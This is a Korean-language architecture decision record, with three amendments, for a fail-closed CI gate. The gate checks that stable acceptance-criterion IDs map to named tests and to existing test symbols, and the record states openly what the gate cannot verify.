---
adr_number: 145
title: 요건 traceability zero-drop 게이트 — AC-ID 부여 + phase-aware 2-tier presence/mapping fail-closed (semantic 천장 정직 공개)
status: Accepted
category: governance
date: 2026-07-11
carrier_story: CFP-2603
supersedes: []
related_adrs:
  - ADR-006  # §8 Test Contract authoring mechanism owner — 이 mechanism 이 AC-1..AC-8 emit. Amd2 L266 "presence-anchor completeness 를 real 인 양 강제 = 검사연극" = 본 게이트 천장(AC-8) 의 isomorphic 선례. G1 = 이 관례를 요구사항 단계 범용 AC-ID 로 일반화 (충돌 아님, 상류 확장)
  - ADR-008  # Inter-plugin Contract Versioning — requirements-output-v1 count→AC-list = additive MINOR(v1.2, count 보존) / design-output-v2 marker = additive MINOR(v2.5). count 제거 MAJOR 회피 (CONFLICT-A 해소, §결정 6)
  - ADR-119  # research-before-claims — 게이트는 proxy 아닌 ground-truth 검증. presence/mapping 만 fail-closed, semantic 완전검증 강제하는 척 = 검사연극(§결정 4). 천장 정직 공개(2 잔여, §결정 5)
  - ADR-125  # 요구사항리뷰 lane — §결정2 "branch-protection 6-tuple 불변" 선례는 phase-gate INTERNAL 흡수 전제. 본 ADR 은 fail-closed 비호환(anchor=warning-tier + fast-pass bypass 실측)으로 이 선례를 override 하고 신규 required job 정당화 (CONFLICT-C, §결정 3). §5.6 RO-1 = ADR-125 Amd2-style additive disjoint 축 신설 선례
  - ADR-127  # no-exemption 정식 풀 플로우 — 게이트에 skip/opt-out/default-green 경로 신설 금지 상위 원칙. transition = forward-only + grandfather (skip-toggle 금지, §결정 4 AC-7)
  - ADR-069  # Multi-Repo Story Key System — AC-ID owner 아님 (오귀속 정정, Domain+Continuity 이중 확인). AC-ID = Story-local namespace, ADR-069 Key system 과 disjoint
  - ADR-052  # 요구사항 single-shot / divergence debate — user→AC hop defense-in-depth 3층 중 (c) Codex proactive check divergence
  - ADR-136  # frontend 품질게이트 표준 — Amd3 L1/L2/L3 execution-liveness 3요건 + L3 "linter 자체 mutation-self-test" (born-missing linter file∧function grep-only = CFP-2545 false-oracle → §8 linter self-test, CONFLICT-B 해소). frontend.applicable default-false 2-layer 동형(consumer-applicability)
  - ADR-133  # ADR-RESERVATION atomic claim — 본 ADR 번호(145) claim→write→row-append 3-step 발급 (claimant ArchitectAgent:CFP-2603)
  - ADR-060  # shadow-required 승격 evidence-gate 선례(§결정 6/19) — 본 ADR 에서 (B) shadow-required = 미채택 대안(§대안); 채택 = (A) 즉시 required. ModuleArch digest 의 "ADR-130 §결정6 7-day-green" 오citation 정정 (ADR-130 = applicability⊥closure, 무관)
  - ADR-005  # N/A 명시 패턴 — §11 데이터 마이그레이션 N/A (wrapper-self governance, schema/data 무변경) 근거
  - ADR-068  # boundary invariant I-1~I-5 — deputy mandate boundary (chief tie-break ladder 2단계) + I-3 guard placement(unconditional 우선) + I-4 wording SSOT
  - ADR-013  # dogfood-out — 본 ADR = Story §7 설계 SSOT, Change Plan 병존(internal-docs). ADR-127 :115 정합
  - ADR-151  # (Amendment 1) G6 형제 — live=6-tuple ↔ doc=7-tuple divergence 를 "CFP-2609 reconcile 대기"로 명문 기록(ground-truth). §결정 8 이 그 reconcile carrier. self-test execution-liveness = 등록 ordering invariant 의 self-test green 채널 근거
  - ADR-152  # (Amendment 1) G3 형제 — Epic CFP-2602 "게이트 G당 1 신규 ADR" 패턴이 신규 게이트에만 적용됨(152=G3 dark-path 점유)을 A2-5 판정에서 인용. CFP-2609=G1 완결 carrier(신규 게이트 아님) → Amendment 채택 근거
  - ADR-147  # (Amendment 3) CI runner topology — CFP-2644 prevention 3번째 N-class 의 workflow-compilability/expression-validity 축이 ADR-147(배선된 job→실 runner 배정) 및 ADR-151 G6(self-test wired)과 disjoint 신규 축임을 A2-5 disjoint-axis 논거에서 인용
  - ADR-130  # (Amendment 1) applicability⊥closure positive-whitelist — per-PR applicability(축 c) 가 consumer-배포 applicability(축 a)·repo-guard(축 b)와 disjoint 함의 selector. positive detection·non-suppressible 성질 차용(§결정 8 B)
related_concepts:
  - ac-traceability-zero-drop
  - presence-mapping-ceiling-honesty
  - per-pr-applicability-scoping
is_transitional: false
---

# ADR-145 — 요건 traceability zero-drop 게이트 (AC-ID + phase-aware 2-tier presence/mapping fail-closed)

## 상태

Accepted (2026-07-11 KST) — CFP-2603 (Epic CFP-2602 G1) carrier. 사용자 요건이 요구사항→설계→§8 테스트→구현 사슬을 지나며 조용히 증발하는 병(Gap A, 요건-현실 갭)을 도메인 불변식 위반으로 재정의하고 기계 게이트로 강제하는 governance SSOT. 강화(ratchet↑) 방향 — 기존 게이트 무변경 위에 신규 fail-closed 게이트 1개 + 계약 2 additive MINOR + review obligation 1축 추가. 약화 surface 0.

**Amendment 1** (2026-07-12 KST, CFP-2609 — Epic CFP-2602 G1 완결 carrier): **§결정 8** 신설 — (1) per-PR applicability 가드(신호 C = resolved authoritative §5 ≥1 normative AC presence, 3번째 applicability 축) (2) §결정4 no-optout 정의역 명확화("opt-out(적용 PR escape) ≠ applicability-scoping(비대상 판정)", exception-through-interpretation 봉인) (3) I-APPLIC 불변식(objective ∧ non-suppressible ∧ 판정불가≠비적용 anti-degradation ∧ forward-only) (4) 단일 판별 모델(phase × resolve-outcome 매트릭스) (5) §결정3 이 선언한 6→7 required 등록의 미완결 reconcile 완결(live=6-tuple → doc=7-tuple 로 승격, ADR-151 이 명문한 divergence 해소). ratchet↑ 방향 — scope 정정(false-red 제거)이지 검출력 약화 아님. 약화 surface 0. **§결정1-7 무supersede·무rewrite**(append-only).

> **Amendment 1 결과문 정정 (Amendment 2, CFP-2634)**: 위 (5) "live=6-tuple → doc=7-tuple 로 승격" + 아래 §결정8(G)·Amendment 1 결과("reconcile 후 live=doc=7-tuple 완결")는 **과잉선언(premature)** 이었다. CFP-2609 등록 직전 canary(비적용 no-story_uri PR)가 어댑터 결함을 실측 포착 → 즉시 rollback → **live 실측 = 6-tuple 잔존**(등록 HELD, ADR-119 verify-before-trust 비가역 경계). 실제 상태 = "reconcile HELD, live=6-tuple". Amendment 2(§결정 9)가 그 결함을 선수정 후 CFP-2634 Phase-2 등록 시점에 hold→완결 로 상태 전이한다.

**Amendment 2** (2026-07-12 KST, CFP-2634 — #2632 carrier, CFP-2609 follow-up): **§결정 9** 신설 — story_uri-absent 도메인의 **non-applicable 선언 경로**(`ac_applicability: none — <사유>`) codify. Amendment 1 §결정8 이 모든 PR 의 story_uri 보유를 암묵 가정(신호 C = fetch 요구 = story_uri 요구)했으나, 실측상 story_uri hygiene 비균일(정당한 무-AC governance PR 다수가 story_uri 부재) → story_uri 부재 정상 PR 오차단. 본 Amendment: (1) **(a) non-applicable 선언 경로 채택**((b') story_uri 보편 강제 기각 — 진짜 AC-표면-없는 변경 미처리 + blast radius) (2) 마커 = **INPUT(저자선언, OUTPUT 세탁 불가)** — story_uri 부재 시 core 미실행이라 OUTPUT emit 불가 → **applicability-scoping 프레임으로만 화해**(opt-out 프레이밍 = §결정4 AC-7 위반 금지) (3) **Option B core-소화**(어댑터 = thin router, 적용성 verdict = core 단일소유 무손상 — 어댑터 short-circuit verdict 재범 금지, §결정7/§결정8 D) (4) **I-APPLIC non-suppressible 를 story_uri-conditional 로 정직 re-scope + disclosed residual**(silent 약화 금지 — 이 절 미개정 시 born-hollow invariant) (5) §결정8(D) 매트릭스에 **story_uri-absent 행 append** (6) §결정8(G)/Amendment 1 결과문 정정(hold→완결) (7) reason free-text **injection 가드**(env-var 전달, `${{ }}`→`run:` 보간 금지). ratchet↑ 방향 — story_uri-absent false-red 제거(scope 정정)이지 검출력 약화 아님, 신설 약화는 명시 disclose. **§결정1-8 무supersede·무rewrite**(append-only — 매트릭스 행 append + non-suppressible 문언 re-scope + 결과문 정정만).

**Amendment 3** (2026-07-13 KST, CFP-2644 — #2642 carrier, CFP-2634 §결정9(G) follow-up regression): **§결정9(G) injection 가드 주석 자체가 born-invalid regression 을 자초**. CFP-2634 #2639(commit `e2ba7b9d`)가 §결정9(G) injection 가드를 **문서화하는 주석**을 `ac-traceability-matrix.yml` 양 사본 L192(`run: |` 블록 내부, byte-identical)에 추가하면서 그 주석 텍스트에 리터럴 빈 표현식 `${{ }}`(중괄호 사이 공백만)을 포함했다. GitHub Actions 는 `run:` 블록 문자열 전체를 러너 전송 *이전에* 표현식으로 보간(셸 `#` 주석 무개념 — [verified: GitHub Docs "the context will be interpolated ... before the job is sent to a runner"])하므로 빈 표현식 = load-time syntax error → 워크플로 전체 invalid → `on: pull_request` 트리거 미등록 → **#2639 merge(2026-07-12T13:24Z) 이후 모든 신규 PR 에서 게이트 dead**(born-invalid gate — hollow 보다 깊은 non-existent, ADR-136 결정13 css-lint born-invalid 의 형제 발현). 자연실험 반증: `spawn-prompt-fact-verify.yml` L18 은 동일 문구를 담고도 **top-level YAML 주석**(run: 밖)이라 valid — 판별자 = run:-블록 내부 위치. 본 Amendment:
> (1) **양 사본 L192 정정** — 리터럴 `${{` 토큰 완전 제거·평문 재서술(injection 가드 의미 = 사유 env-var `$NONE_REASON` 전용 보존, `${{ }}`→run: 보간 금지 서술은 브레이스 문자 없이 유지, byte-identical mirror 보존). Phase 2 구현.
> (2) **prevention forcing-function = include (본 Story)** — `run:`-블록 내 빈/malformed `${{ }}` 검출을 **ADR-136 결정14 N-class registry(`tests/scripts/test-actionlint-workflows.sh`)의 3번째 class 로 등록**. 이는 결정14 §14.3 "class registry 데이터 등록"의 **authorized execution**(신규 mechanism 0 → ADR-136 무amend, 상세 = Change Plan §3/§8). discriminating-power **execution-backed 실측 확정**: actionlint 1.7.12 가 run:-블록 빈 `${{ }}` 를 `unexpected end of input while parsing ... [expression]`(exit 1)로 flag ∧ top-level 주석 빈 `${{ }}` 는 exit 0(YAML 파서 폐기 → 자연 false-positive 회피) [verified: docker `rhysd/actionlint:1.7.12` RED/control/GREEN 3-fixture 실행]. error_string pin = 기존 2 class(`not allowed here` / `is not defined in object type`)와 disjoint 한 `unexpected end of input while parsing`. **workflow-compilability/expression-validity 축** = ADR-151 G6(self-test wired)·ADR-147(runner 배정)과 disjoint 신규 축. **결정14 B(whole-workflow actionlint blocking 승격 + branch-protection 8-tuple) 무침범** — actionlint self-test 는 wrapper-self-only non-required 유지, class 만 추가(ADR-060 evidence-gate defer 보존).
> (3) **6→7 등록 재정산 (ground-truth 정직)** — 등록 대상 workflow 자신이 born-invalid 였으므로 §결정3/§결정9(H) ordering invariant("workflow valid ∧ self-test green ∧ own-PR green ∧ genuine 비적용 canary surfacing+PASS THEN 등록")가 **구조적으로 미충족 상태**였다(own-PR green = born-invalid 상 불가). Amd3 은 born-validity 복구 + ordering invariant **재진입**만 declare 하며 **live=7-tuple 완결을 선언하지 않는다** — 6→7 완결은 Phase 2 정정 merge 후 genuine 비적용 canary(no story_uri + `ac_applicability: none — <사유>`) 실 PR surfacing+PASS 실측 이후로 gated(HELD 유지, ADR-119 verify-before-trust — Amendment 1/2 premature-declaration 교훈 재범 금지). canary 미충족 시 등록 계속 defer(#2632 트랙 계승).
> **A2-5 판정 (Amendment vs 신규 ADR) = Amendment 3 (ADR-145 무supersede)**: new-ADR prong 기각 — Epic CFP-2602 "게이트 G당 1 신규 ADR"은 신규 게이트 G(G1=145/…/G6=151)에만 적용, CFP-2644 는 신규 G 0(기존 G1 regression fix + ADR-136 결정14 N-class 실행). prevention 은 결정14 authorized-execution 이라 ADR-136 amend 조차 불요(§결정8/§결정9 A2-5 구조 답습). ratchet↑ 방향(born-validity 복구 + prevention 추가), 약화 surface 0. **§결정1-9 무supersede·무rewrite**(append-only — 상태전이 declare + prevention cross-ref 만).

## 컨텍스트

사용자 원문(Story §1 verbatim): mctrader 개발 중 "5분/1시간 compactor" 요건을 세 번 주장했으나 반영되지 못함. 3-angle forensic 실측 결과 = 요건이 lane 경계를 넘으며 증발(Gap A). 실측된 증발 지점:

- **유일 계약 `requirements-output-v1` 이 AC 전체를 `sub_agent_results.analyst.acceptance_criteria_count: <int>` 정수 하나로 붕괴** [verified: `docs/inter-plugin-contracts/requirements-output-v1.md` L90, origin/main]. 항목 identity 소멸 → 하류 lane 이 "사용자가 요구한 것의 체크리스트"를 하나도 쥐지 못함.
- `scripts/lib/check_story_section_schema.py` = §N 헤딩 존재만 검사(§1~§11 strict), AC↔테스트 매핑 로직 부재, fail-closed `sys.exit(1 if errors>0)` [verified: L133-140].
- `.github/workflows/phase-gate-mergeable.yml` = 단일 job `check-gate` [verified L21]. **anchor 계층(CFP-900 §4.13 L369 / S6 provenance L581 / S7 L648)이 전부 `checks.create` 이후 try/catch-silent warning-tier** [verified] + **fast-pass OR-gate(`isEpicLabel||isSiblingPr||isPostMergeFix||isLabelMismatchOnly`) L359 → early-return success L414-423** — Epic/sibling PR 은 in-line matrix 를 우회.
- 각 lane 이 사용자 요건을 산문으로 재해석해 자기 범위를 스스로 재도출 → 항목 침묵 삭제가 전 게이트 green.

도메인 불변식 **I-AC**: "AC 는 사용자 의도의 안정적 참조자이며 lane 경계를 넘어 보존돼야 한다." 현재 계약은 identity(AC-N)를 정수 count 로 붕괴시켜 이를 깬다.

외부 근거(Story §6 재인용 — 신규 외부 단정 없음): RTM + bidirectional traceability 는 확립된 관행이다 (ISO/IEC/IEEE 29148 traceability mechanism / DO-178C §5.5(Software Development Process Traceability)·§6.4 상위요건↔하위요건↔검증자산 양방향 필수 / NASA SWE-052·SWE-059 bidirectional). 동시에 RTM 은 드롭을 **줄이지만 없애지 못한다** — traceability rot / 유지비용 / rubber-stamping (Jama Software). ∴ 자동화로 rot·수동오류는 저감하나 semantic 완전성 봉인은 불가(§결정 5 근거).

## 결정

AC 에 lane 경계를 넘어 안정적인 식별자(AC-ID)를 부여하고, `AC-N ↔ §8 명명 테스트 ↔ 실 테스트파일` zero-drop 을 신규 fail-closed 기계 게이트로 강제하되, 기계가 강제 가능한 것(presence/mapping)의 천장을 정직히 공개한다. 착지 = 신규 lint 모듈 + 신규 required workflow + 계약 2 additive MINOR + 요구사항리뷰 lane 3번째 disjoint 축.

### 결정 1 — presence/mapping 천장 + no-hollow 정직 (ADR-006 Amd2 L266 isomorphic)

- **기계 게이트는 presence/mapping 까지만 fail-closed 로 강제한다**: (i) AC-N well-formed + §5.2 **machine-enforced 필수 4필드(id/statement/source/tier)** 존재·well-formed (derived 필드 verification/coverage_required/phase = §결정6 파생, Hop1 미재검증), (ii) 모든 AC-N → ≥1 §8 명명 테스트 매핑, (iii) 명명 테스트의 실 파일 ∧ 실 symbol 존재(born-missing 차단).
- **"테스트가 요건을 의미상 올바르게·완전히 검증하는가"(semantic correctness/completeness)를 강제하는 척 = 검사연극** — ADR-006 Amd2 L266("presence-anchor completeness 를 real 인 양 강제 = 검사연극")의 **isomorphic 선례**를 직접 적용한다 (ADR-119 §결정 4 정합).
- **두 잔여 정직 공개 (no-hollow honesty)**: (a) test-semantic 완전성 미강제, (b) **user→AC 분해-완결성**(AC 집합이 사용자 의도에 완전한지) 미강제. 둘 다 fail-closed 아니며 §결정 2 review obligation + advisory 로 mitigate. **"완전 봉인" hard-claim 금지** — "구조적 born-missing fail-closed + semantic 저감 + 잔여 정직 공개"로 재약속.
- **(c) layer-separation clarification (잔여 아님 — count 는 2 유지)**: §5.2 derived 필드(verification/coverage_required/phase) 완결성은 **미강제 잔여가 아니다** — 계약(requirements-output-v1)·Hop2·review 층에서 실제 강제되며, 게이트의 §5-parse Hop1 만 재검증하지 않는다(강제 지점 이동, 미강제 아님). ∴ 잔여 count = **2 로 유지**(`CEILING_DISCLOSURE`·Change Plan §3.2(e)/§8.1 정합). required 4필드(id/statement/source/tier)는 Hop1 `validate_ac_record` fail-closed 로 강제(AC-2 non-hollow).

### 결정 2 — phase-aware 2-tier + 3-tier AC model + user→AC review obligation

**phase-aware 2-tier** (ADR-127 Phase 1 문서 / Phase 2 구현 PR 분리 정합 — Phase 1 시점 실 테스트파일 부재하므로 단일 tier 는 전면 false-FAIL):
- **Tier-1 (Phase 1)** = AC-N ↔ §8 계약에 **명명된** 테스트 fidelity (이름·매핑 존재). born-missing 미실행.
- **Tier-2 (Phase 2)** = §8 명명 테스트 ↔ **실 파일 ∧ 실 symbol** 존재.
- **phase 신호 = EXPLICIT** (Story frontmatter `phase:` / workflow `--phase` 명시 인자) — diff 추론 금지 (TestContract dissent-1 채택, ambiguity 제거).

**3-tier AC model** (§5.2 `tier` enum — Risk5 bypass surface 대응 §결정 2 하단):
- `normative` = fail-closed 기계 강제 (AC-1a·AC-2..AC-9). §8 명명 테스트로 커버.
- `declared` = fail-closed 아님, human/review-verified obligation (AC-1b). 대조할 요건 인벤토리 부재로 기계 강제 불가 — §5.6 RO-1 이 검증. **forged machine test 금지**.
- `advisory` = 경보만, blocking FAIL 권한 없음 (AC-10).

**user→AC review obligation (RO-1)**: 첫 hop(사용자 산문 → AC 민팅)은 대조할 요건 인벤토리가 없어 fail-closed 불가(Hop0). 요구사항리뷰 lane 이 §1 verbatim 사용자 원문 ↔ §5 AC 목록을 대조하여 "구별되는 각 사용자 요건이 ≥1 AC 에 매핑됨"(AC-1b 완결성)을 검증한다(미매핑 = review FIX, 설계 진입 차단). **ADR-125 Amendment 2 방식의 additive disjoint 축** — 요구사항리뷰 lane 의 3번째 축(external-fact / internal-invariant / **AC-decomposition-completeness**)으로 편입. binding = `requirements.md` review-checklist + `RequirementsReviewPLAgent.md` + `codeforge:review-responsibility` matrix. **tier 배정 검증 동반 (Risk5)**: user AC 를 advisory 로 오분류하면 강제가 약화되므로 RO-1 이 tier 배정 자체를 review-gate 한다.

- **defense-in-depth 3층** (user→AC hop, 모두 fail-closed 아님을 결정 1(b)가 공개): (a) RO-1 §1↔§5 diff + (b) AC-10 advisory 반복주장 신호 + (c) ADR-052 divergence(Codex proactive).

### 결정 3 — 신규 dedicated required workflow (CONFLICT-C divergence 정당화)

- **phase-gate-mergeable.yml 확장 기각 (Feasibility Barrier 1)**: check-gate 에 in-line matrix 를 얹으면 두 실패 모드 — (a) anchor 계층과 동형인 warning-tier(merge 미차단, ratchet 0) 또는 (b) fast-pass OR-gate(L359→L414-423) 로 Epic/sibling PR bypass. 양쪽 다 fail-closed 요건(AC-7)과 비호환. [verified: phase-gate-mergeable.yml L369/L581/L648 warning-tier + L359 fast-pass bypass, origin/main]
- **신규 dedicated workflow `.github/workflows/ac-traceability-matrix.yml`** (job-id = context name `ac-traceability-matrix`, double-context 회피) 를 **day-1 hard-fail** 로 배선한다 — fail-closed 로직 즉시 활성(실 red/green + PR red X).
- **wrapper-self-only 확정 (F1 — consumer born-broken 방지)**: 신규 workflow 는 `ALLOWED_HUB_REPOS: mclayer/codeforge-internal-docs` 하드코딩 + fail-closed no-optout 이라 consumer repo 에 배포되면 consumer venue≠whitelist → return false → 전 consumer PR born-broken hard-block. venue-shape self-test job wrapper-guard 선례를 따라 workflow 에 **repo-guard `if: github.repository == 'mclayer/plugin-codeforge'`** 를 명시한다(`templates/github-workflows/` byte-identical copy 도 동일 guard 상속 → consumer 배포 시 inert job skip). consumer 전파(ALLOWED_HUB_REPOS venue 파라미터화 + `project.yaml` applicability 게이트)는 **별도 follow-up Story** — 지금 consumer 활성 배포 금지(§대안·Change Plan §12.1).
- **CONFLICT-C divergence 정당화**: ADR-125 §결정2 "branch-protection 6-tuple 불변" 선례는 phase-gate **INTERNAL 흡수**(요구사항리뷰 gate 를 기존 check-gate 로 매핑)를 전제했다. 본 게이트는 그 흡수 경로가 **fail-closed 비호환**(anchor=warning-tier + fast-pass bypass 실측)이므로 선례가 성립하지 않는다 → 신규 required job 이 정당하다. ADR-125 선례 override 는 **비호환 근거에 한정**되며 6-tuple 불변 원칙 자체를 폐기하지 않는다.
- **branch-protection required_contexts 등록(6→7-tuple) = 사용자 결정 → 채택 = (A) 즉시 required 등록** (2026-07-11 사용자 결정): G1 게이트를 도입하는 Phase 2 PR 머지 시점에 `required_status_checks.contexts[]` 에 신규 context `ac-traceability-matrix` 를 즉시 추가(6→7-tuple). CLAUDE.md "브랜치 보호" 표 + arch-doc C4 갱신은 Phase 2 PR 동반.
- **A 채택의 born-broken 안전 전제 (핵심 정당화 — 2 guard 구분)**: 즉시 required 의 실패 모드는 둘이며 각각 별 guard 로 차단된다 —
  - **(i) false-green (permissive/hollow)** = 게이트가 결함을 놓쳐 무의미하게 통과 → **§8 self-test(mutation-kill A/B/C + F-fixture 12종 RED→GREEN)가 merge-precondition** 으로 차단(hollow 린터는 self-test RED 로 merge 불가).
  - **(ii) false-red / born-dead** = 게이트가 정상 PR 을 오차단하거나 아예 실행되지 않음 → **workflow-runs-on-own-PR**(G1 도입 Phase 2 PR 자체가 신규 게이트의 실 red/green 을 산출)로 검출.
  - **∴ ordering invariant (등록 순서 강제)**: `workflow 착륙 → self-test suite green 확인 → 게이트가 자기 PR 에 실 green 산출 확인 → THEN required_contexts 등록`. 이 순서를 지키면 born-broken 린터는 required 로 등재 불가. 안전 전제 = **self-test green ∧ own-PR green**(born-broken gate class 대비 — CFP-2530 css-lint born-invalid / CFP-2535 execution-liveness 계보). false-red 재발 시 revert = trivial(§결과·Rollback).
- (참고: ModuleArch digest 의 "ADR-130 §결정6 7-day-green" 은 오citation — ADR-130 = applicability⊥closure 분류. shadow-required 승격 evidence-gate SSOT = ADR-060 §결정 6/19. 본 결정에서 shadow-required(B)는 §대안 참조 — 고려됐으나 미채택.)

### 결정 4 — fail-closed no-optout + AC-ID namespace + sub-letter grammar

- **fail-closed no-optout (AC-7)**: skip-PASS / opt-out / default-green 경로 부재. 판정 불가(cross-repo fetch 실패 / token 부재 / 403·404)는 **helper fail-closed 패턴**(phase-gate-mergeable.yml `if(!token) return false` L232 형)을 재사용 — main-path degrade(L69-70 PR-label fallback)는 재사용 금지. **403/404 conflation 가드**: born-missing verdict 는 `resp.ok` 확인 후에만 — "읽을 수 없음"을 "존재하지 않음→verdict 없음"으로 해석 금지.
- **fetch 물리 재구현 회피 (F2 — Phase 2 carryover)**: adapter-층 cross-repo fetch(PAT/whitelist/token/`resp.ok` 403-404 가드)를 phase-gate 로부터 물리 복제하면 2 divergent copy = drift 위험. 본 결정은 "개념 재사용" 선언에 그치지 않고, Phase 2 에서 cross-repo fetch 를 **shared reusable-workflow / composite-action 으로 추출**해 단일 소유·재사용할 의도를 명시한다(비차단, ADR-042 Amd13 reusability 정합).
- **4 bypass vector 차단(F-AC7-a..d)**: 빈 AC 목록 / 미선언 §8 / stub 명명 회피 / phase 오선언.
- **transition = forward-only + grandfather** (Story date/KEY 기준). **skip-toggle 신설 금지** — toggle 은 ADR-127/AC-7 opt-out 이 된다.
- **AC-ID namespace = Story-local** (`AC-N`); cross-Story 참조 = `<KEY>:AC-N`.
- **AC_ID_RE SSOT = sub-letter 수용** (`^AC-(\d+)([a-z])?$`): 본 Story 자체의 `AC-1a`/`AC-1b` sub-letter ID 가 naive `AC-\d+` regex 에 조용히 drop 되면 zero-drop 위반(CRITICAL TRAP — RefactorAgent). AC_ID_RE 는 단일 SSOT leaf(`scripts/lib/ac_id.py`)로 추출하여 lint·계약·후속 재사용이 공유한다.

### 결정 5 — born-missing = 실 symbol/node resolve (grep 금지) + linter self-test (CONFLICT-B)

- **born-missing 검출 = 실 파일 ∧ 실 symbol resolve** (Python `ast` 파싱으로 명명 테스트 함수/클래스 node 존재 확인) — **grep 금지**(F-ORACLE-GUARD). presence-grep(파일∧함수 문자열 매칭)은 CFP-2545 false-oracle 계열 결함(주석·docstring·문자열 안 매칭 = 거짓 PASS).
- **linter 자체 mutation-self-test 의무** (ADR-136 Amd3 L3 / CFP-2535 execution-liveness): "file∧function grep 만으로 born-missing 판정" 자체가 false-oracle 이므로, born-missing linter 는 자기 자신을 mutation A/B/C 로 반증 통과해야 한다. §8 Test Contract 에 linter self-test 포함.

### 결정 6 — 계약 2 additive MINOR (CONFLICT-A 회피)

- **`requirements-output-v1` v1.1 → v1.2 (additive MINOR)**: 기존 `sub_agent_results.analyst.acceptance_criteria_count: <int>` **보존**(제거 = MAJOR = CONFLICT-A). 신규 top-level `acceptance_criteria[]`(optional, `sub_agent_results`/`writes_completed` 와 peer) 추가 — 각 item = §5.2 스키마 **2-등급**: **required(id/statement/source/tier) = machine-enforced (Hop1 `validate_ac_record` fail-closed, AC-2 non-hollow)** + **derived(verification/coverage_required/phase) = 파생(`coverage_required←tier+Hop2` / `phase←run-phase+tier` / `verification←tier+Hop2·review`), present 시 format-only, 완결성 = 계약·Hop2·review 층(게이트 §5-parse 미재검증)**. **게이트가 list 실재를 강제**(AC-3 항목화 전달)하되 **계약 field 는 영구 optional 유지**(ADR-008 §결정2 backward-compat MINOR).
- **`design-output-v2` v2.4 → v2.5 (additive MINOR, Model A)**: `chief_author_artifact.ac_coverage_self_check_passed: bool` marker 추가 (기존 self-check disjoint 축 group `architecture_doc_updated` 등과 peer, default false). marker 텍스트 = "**authoritative Test Contract location** 에서 AC↔§8 coverage self-check 통과"(문서유형별 — "Story §8" 단정 금지). packet 에 RTM 중복 금지(marker bool 만).
- **RTM location-resolution 규칙 (P1 — 게이트가 Test Contract 를 resolve 하는 위치)**: 게이트는 §8 Test Contract(RTM)를 **그것이 authoritative 하게 존재하는 위치**에서 resolve 한다 — **wrapper-self dogfood Story = Change Plan §8**(Story §8=개발서사 placeholder 일 때) / **consumer Story = Story §8 mirror**. 이 규칙이 없으면 Phase 2 구현자가 wrapper-self 의 Story §8(placeholder)을 파싱 → 본 Story 자신의 Phase 2 PR 을 false-FAIL(게이트가 막으려는 바로 그 silent location-mismatch). 게이트 입력은 문서유형 판별 후 authoritative location 을 선택한다.
- **MANIFEST 3-point parity** (Phase 2 mechanical sync): 각 계약의 (i) frontmatter contract_version, (ii) 본문 version, (iii) `docs/inter-plugin-contracts/MANIFEST.yaml` entry 를 동시 이동(v1.2 / v2.5). atomic.

### 결정 7 — 모듈 경계 (Ports & Adapters — network-0 pure core)

- **pure core (offline-testable, network-0)**: `scripts/lib/ac_id.py`(leaf — AC_ID_RE grammar + §5.2 스키마 파서) + `scripts/lib/check_ac_traceability_matrix.py`(매핑 로직 — Hop1 AC well-formed / Hop2 AC↔§8 coverage / Hop3 §8↔symbol born-missing).
- **adapter I/O layer (경계 confined)**: `scripts/check-ac-traceability-matrix.sh`(thin wrapper — ADR-061 §결정1 convention, `check-venue-shape-fidelity-presence.sh` 동형) + `.github/workflows/ac-traceability-matrix.yml`(fetch/cross-repo I/O 전담).
- 3 seam(parse / Phase1-map / Phase2-born-missing)이 phase-aware 2-tier 의 구조적 불변식. cross-repo fetch·fs I/O 는 workflow layer 에만.

### 결정 8 — per-PR applicability 가드 + "opt-out ≠ applicability-scoping" 정의역 명확화 + 6→7 required 등록 reconcile 완결 (Amendment 1, CFP-2609)

**배경**: §결정3 이 (A) 즉시 required 등록(6→7-tuple)을 선언했으나, 등록의 born-broken 안전 전제("self-test green ∧ own-PR green")가 CFP-2603 시점에 미충족 — 게이트가 story_uri 부재/transient-ref PR · Phase-1 rtm_uri 부재 · §5-AC 없는 governance PR 을 무조건 fail-closed 처리하여 **자기 PR 을 포함한 정상 PR 전부 오차단**(false-red). 즉시 등록 시 repo 파괴 → 등록 HELD(merge 경계 verify-before-trust, ADR-119). live=6-tuple ↔ doc(CLAUDE.md 브랜치 보호 표 + branch-protection-audit)=7-tuple divergence 로 잔존(ADR-151 이 "CFP-2609 reconcile 대기"로 명문 기록). 본 Amendment = 그 reconcile carrier — §결정3 의 미완결 등록을 **적용성(applicability) 가드 선수정 후** 안전 완결한다.

**A2-5 판정 (Amendment vs 신규 ADR — ADR-146 §결정11 / ADR-151 §결정1 verbatim 구조; 양 prong 반증)**:
- **Amendment prong (ADR-145 로 착륙) = 채택**: CFP-2609 은 (i) §결정4 no-optout 의 **정의역 명확화**("opt-out ≠ applicability-scoping") + (ii) §결정3 이 이미 선언한 6→7 등록의 **미완결 실행** 뿐이다. 신규 mechanism 도입 0 — 신규 workflow 0(기존 `ac-traceability-matrix.yml`/core 수정), 신규 required context 0(§결정3 이 이미 선언한 6→7), 신규 스키마 0(§5.2 AC schema·`AC_ID_RE` 재사용), 신규 게이트/카테고리 0. per-PR applicability 는 기존 게이트의 self-scoping 정련이지 standalone governance mechanism 아님 → 별 context/결정/결과 블록이 ADR-145 중복.
- **신규 ADR prong (왜 신규 아닌가) = 기각**: Epic CFP-2602 "게이트 G당 1 신규 ADR" 패턴은 *신규 게이트 G*(G1=145 / G2=148 / G3=152 / G4=146 / G5=150 / G6=151)에 적용된다. CFP-2609 은 신규 게이트를 추가하지 않고 **G1(ADR-145) 자신의 applicability 정련 + 등록 완결** carrier 이므로 새 G 슬롯이 아니다. per-PR applicability("세 번째 적용성 축")는 개념적으로 신규이나 ac-traceability 게이트 작동 *내부*에 confined — ADR-133 atomic-claim 신규 번호 소요 0.
- **판정 = Amendment 1 (ADR-145 무supersede)** — diff-proven: 본 Amendment 는 §결정4·§결정3 을 rewrite/삭제하지 않고(append-only) 문언의 해석-정의역만 정련 + 등록 완결. 어느 것도 신규 결정/mechanism 아님.

**(A) "opt-out ≠ applicability-scoping" — §결정4 no-optout 정의역 명확화**:
- §결정4 "skip-PASS / opt-out / default-green 경로 부재 + skip-toggle 신설 금지"의 정의역 = **적용 대상 PR 의 escape**(§5 에 AC 를 선언한 PR 이 검사를 회피). 무손상 유지.
- **applicability-scoping** = 그 이전 단계에서 "이 PR 이 애초 검사 대상이냐"를 objective 하게 가르는 직교(orthogonal) 선행 판정. 검사 대상 부재(추적할 AC 자체가 없음) PR 은 **불변식 I-AC 의 정의역 밖** — skip-PASS/opt-out 이 아니라 자연 N/A(ADR-127 §결정5 3축 AND 동형).
